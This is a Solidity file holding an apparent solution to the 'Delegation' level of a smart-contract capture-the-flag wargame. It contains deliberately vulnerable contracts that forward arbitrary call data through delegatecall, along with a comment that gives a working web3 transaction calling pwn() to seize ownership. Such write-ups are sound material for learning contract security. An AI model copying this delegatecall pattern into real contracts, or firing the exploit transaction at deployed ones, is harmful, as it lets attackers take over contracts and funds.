// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 6. DELGATION
 * @dev Claim ownership of the contract to complete this level.
 */

/*
Send a transaction to the Delegation contract to trigger the fallback() function
The fallback() function will call the pwn() function with its own storage thanks to delegatecall

@params:
- from: your wallet address
- to: the Delegation instance address
- data: Method Id of the pwn() function: "0xdd365b8b"
await web3.eth.sendTransaction({ from: "your wallet address", to: "0xb59aCD7131cE6c4CbAAF32e8A06Da14f65C09268", value: "0", data: "0xdd365b8b"});


🎉 Level completed! 🎉
*/

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
